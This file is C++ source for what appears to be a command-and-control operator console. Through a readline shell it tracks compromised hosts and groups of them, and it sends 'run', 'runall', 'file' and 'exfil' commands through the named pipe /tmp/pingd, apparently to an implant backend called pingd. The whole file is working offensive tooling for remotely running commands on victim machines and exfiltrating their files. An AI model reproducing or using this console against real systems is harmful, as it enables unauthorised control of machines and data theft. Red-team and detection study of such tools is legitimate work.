#include <iostream>
#include <map>
#include <vector>
#include <string>
#include <functional>
#include <sstream>
#include <algorithm>
#include <mutex>
#include <fstream>

#include <readline/history.h>
#include <readline/readline.h>

#include <unistd.h>
#include <fcntl.h>

struct command_t
{
  std::function<void(const std::string &)> call;
  std::string desc;
};

using host_mapping_t = std::map<std::string, std::string>;
using group_t = std::map<std::string, std::vector<std::string>>;

/** Currently connected hosts */
static host_mapping_t active_connections = {
  { "localhost", "127.0.0.1" },
  { "pingd", "127.0.0.2" }
};
static std::mutex active_connections_mutex;

/** Groups */
static group_t groups;

/** Currently selected host */
static std::string cur_host;

/** Currently selected group */
static std::string cur_group;

void cmd_help(const std::string &);
void cmd_list(const std::string &);
void cmd_hosts(const std::string &);
void cmd_group(const std::string &);
void cmd_set(const std::string &);
void cmd_run(const std::string &);
void cmd_file(const std::string &);
void cmd_exfil(const std::string &);
void cmd_runall(const std::string &);
void cmd_clear(const std::string &);
void cmd_exit(const std::string &);

static const std::map<std::string, command_t> commands = {
  { "help", { cmd_help, "help: displays usable commands" } },
  { "list", { cmd_list, "list: lists all active connections to the server" } },
  { "group", { cmd_group,
               "group: by default this command lists all groups\n"
               "\tadd/rm [group] [host]: adds/removes a host to a group to run commands on\n"
               "\tload [group] [file]: loads group information from a file\n"
               "\tlist [group]: lists all hosts within a group" } },
  { "set", { cmd_set, "set [host/group]: sets the current host to run commands on" } },
  { "run", { cmd_run, "run [command]: runs a command on the currently set host" } },
  { "file", { cmd_file,
              "file [src] [dst]: sends a file to the currently set host.\n"
              "\tsrc is the file on the server box, and dst is the location on the host machine." } },
  { "exfil", { cmd_exfil,
               "exfil [src] [dst]: exfiltrates a file from the currently set host.\n"
               "\tsrc is the location on the server to save the file, and dst is the location of the file on the host to exfiltrate." } },
  { "runall", { cmd_runall, "runall [command]: runs a command on all active connections" } },
  { "clear", { cmd_clear, "clear: clear the active connections. Useful for testing if connections still exist." } },
  { "exit", { cmd_exit, "exit: stops the server and exits" } },
};

void send_pipe(const std::string &cmd)
{
  int fd = open("/tmp/pingd", O_WRONLY);
  write(fd, cmd.c_str(), cmd.size() + 1);
  close(fd);
}

std::vector<std::string> split_input(const std::string &input)
{
  std::vector<std::string> ret;
  std::istringstream iss(input);
  for (std::string s; iss >> s;) {
    ret.push_back(s);
  }
  return ret;
}

std::ostream &operator<<(std::ostream &os, const host_mapping_t &mapping)
{
  auto it = mapping.begin();
  for (; it != mapping.end(); it++) {
    os << it->first << ": " << it->second << "\n";
  }
  return os;
}

void cmd_help(const std::string &input)
{
  auto it = commands.begin();
  for (; it != commands.end(); it++) {
    std::puts(it->second.desc.c_str());
  }
}

void cmd_list(const std::string &)
{
  std::puts("Listing active machines!");
  std::lock_guard<std::mutex> guard(active_connections_mutex);
  std::cout << active_connections;
}

void cmd_group(const std::string &input)
{
  auto input_arr = split_input(input);

  if (input_arr.size() < 2) {
    auto it = groups.begin();
    for (; it != groups.end(); it++) {
      std::puts(it->first.c_str());
    }
    return;
  }
  auto &sub_cmd = input_arr.at(1);
  if (sub_cmd == "add") {
    if (input_arr.size() < 4) {
      std::puts("usage: add [group] [host]");
      return;
    }
    auto &group_name = input_arr.at(2);
    auto &host_name = input_arr.at(3);
    if (groups.find(group_name) == groups.end()) {
      groups[group_name] = std::vector<std::string>{ host_name };
    } else {
      groups.at(group_name).emplace_back(host_name);
    }
  } else if (sub_cmd == "rm") {
    if (input_arr.size() < 4) {
      std::puts("usage: rm [group] [host]");
      return;
    }
    auto &group_name = input_arr.at(2);
    auto &host_name = input_arr.at(3);
    if (groups.find(group_name) == groups.end()) {
      std::puts("group not found");
    } else {
      auto &group = groups.at(group_name);
      auto itr = std::find(group.begin(), group.end(), host_name);
      if (itr != group.end()) group.erase(itr);
    }
  } else if (sub_cmd == "load") {
    if (input_arr.size() < 4) {
      std::puts("usage: load [group] [file]");
      return;
    }
    auto &group_name = input_arr.at(2);
    auto &filename = input_arr.at(3);
    if (groups.find(group_name) == groups.end()) {
      groups[group_name] = std::vector<std::string>{};
    }
    std::ifstream file(filename);
    if (file.is_open()) {
      std::string host;
      while (file >> host) {
        groups[group_name].emplace_back(host);
      }
      file.close();
    }
  } else if (sub_cmd == "list") {
    if (input_arr.size() < 3) {
      std::puts("usage: list [group]");
      return;
    }
    auto &group_name = input_arr.at(2);
    if (groups.find(group_name) == groups.end()) {
      std::puts("group not found");
    } else {
      auto group = groups.at(group_name);
      for (auto host : group) {
        std::puts(host.c_str());
      }
    }
  }
}

void cmd_set(const std::string &input)
{
  auto input_arr = split_input(input);

  if (input_arr.size() < 2) {
    std::puts("usage: set [host]");
    return;
  }
  if (active_connections.find(input_arr.at(1)) != active_connections.end()) {
    cur_host = input_arr.at(1);
    cur_group.clear();
  } else if (groups.find(input_arr.at(1)) != groups.end()) {
    cur_group = input_arr.at(1);
    cur_host.clear();
  } else {
    std::puts("group nor active connection exists!");
  }
}

void cmd_run(const std::string &input)
{
  auto input_arr = split_input(input);

  if (input_arr.size() < 2) {
    std::puts("usage: run [command]");
    return;
  }

  std::string command;
  for (int i = 1; i < input_arr.size(); i++) {
    command.append(input_arr.at(i));
    if (i != input_arr.size() - 1) {
      command.append(" ");
    }
  }

  if (!cur_host.empty()) {
    std::string ip = active_connections[cur_host];
    std::cout << "Running command \"" << command << "\" on "
              << ip
              << "\n";

    send_pipe("send_command " + ip + " " + command);
  } else if (!cur_group.empty()) {
    auto &group = groups.at(cur_group);
    for (auto &host : group) {
      if (active_connections.find(host) == active_connections.end()) {
        continue;
      }
      std::string ip = active_connections[host];
      std::cout << "Running command \"" << command << "\" on "
                << ip
                << "\n";
      send_pipe("send_command " + ip + " " + command);
    }
  } else {
    std::puts("no group or host selected!");
  }
}

void cmd_file(const std::string &input)
{
  auto input_arr = split_input(input);

  if (input_arr.size() < 3) {
    std::puts("usage: file [src] [dst]");
    return;
  }

  if (!cur_host.empty()) {
    std::string ip = active_connections[cur_host];
    std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
              << ip
              << "\n";
    send_pipe("send_file " + ip + " " + input_arr.at(1) + " " + input_arr.at(2));
  } else if (!cur_group.empty()) {
    auto &group = groups.at(cur_group);
    for (auto &host : group) {
      if (active_connections.find(host) == active_connections.end()) {
        continue;
      }
      std::string ip = active_connections[host];
      std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
                << ip
                << "\n";
      send_pipe("send_file " + ip + " " + input_arr.at(1) + " " + input_arr.at(2));
    }
  } else {
    std::puts("no group or host selected!");
  }
}

void cmd_exfil(const std::string &input)
{
  auto input_arr = split_input(input);

  if (input_arr.size() < 3) {
    std::puts("usage: exfil [src] [dst]");
    return;
  }

  if (cur_host.empty()) {
    std::puts("no host selected!");
    return;
  }

  std::string ip = active_connections[cur_host];

  std::cout << "Receiving file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
            << ip
            << "\n";
  send_pipe("receive_file " + ip + " " + input_arr.at(1) + " " + input_arr.at(2));
}

void cmd_runall(const std::string &input)
{
  auto input_arr = split_input(input);

  if (input_arr.size() < 2) {
    std::puts("usage: runall [command]");
    return;
  }

  std::string command;
  for (int i = 1; i < input_arr.size(); i++) {
    command.append(input_arr.at(i));
    if (i != input_arr.size() - 1) {
      command.append(" ");
    }
  }

  std::lock_guard<std::mutex> guard(active_connections_mutex);
  auto it = active_connections.begin();
  for (; it != active_connections.end(); it++) {
    std::cout << "Running command \"" << command << "\" on "
              << it->second
              << "\n";
    send_pipe("send_command " + it->second + " " + command);
  }
}

void cmd_clear(const std::string &)
{
  std::puts("Clearing active connections");
  std::lock_guard<std::mutex> guard(active_connections_mutex);
  active_connections.clear();
}

void cmd_exit(const std::string &)
{
  exit(0);
}

char *command_generator(const char *text, int state)
{
  static std::vector<std::string> matches;
  static size_t match_index = 0;

  if (state == 0) {
    matches.clear();
    match_index = 0;

    std::string textstr(text);
    for (auto it = commands.begin(); it != commands.end(); it++) {
      auto &word = it->first;
      if (word.size() >= textstr.size() && word.compare(0, textstr.size(), textstr) == 0) {
        matches.push_back(word);
      }
    }

    for (auto it = active_connections.begin(); it != active_connections.end(); it++) {
      auto &word = it->first;
      if (word.size() >= textstr.size() && word.compare(0, textstr.size(), textstr) == 0) {
        matches.push_back(word);
      }
    }

    for (auto it = groups.begin(); it != groups.end(); it++) {
      auto &word = it->first;
      if (word.size() >= textstr.size() && word.compare(0, textstr.size(), textstr) == 0) {
        matches.push_back(word);
      }
    }
  }

  if (match_index >= matches.size()) {
    return nullptr;
  } else {
    return strdup(matches[match_index++].c_str());
  }
}

char **command_completion(const char *text, int start, int end)
{
  return rl_completion_matches(text, command_generator);
}

int main(int argc, char **argv)
{
  cmd_help("help");

  rl_attempted_completion_function = command_completion;

  char *buf;
  std::string input;

  while (1) {
    std::string prompt = (cur_host.empty() ? cur_group : cur_host) + " > ";
    if ((buf = readline(prompt.c_str())) == nullptr) {
      break;
    }
    input = buf;

    if (input.empty()) {
      continue;
    }

    add_history(buf);
    free(buf);

    auto input_arr = split_input(input);

    if (commands.find(input_arr.at(0)) != commands.end()) {
      commands.at(input_arr.at(0)).call(input);
    }
  }

  return 0;
}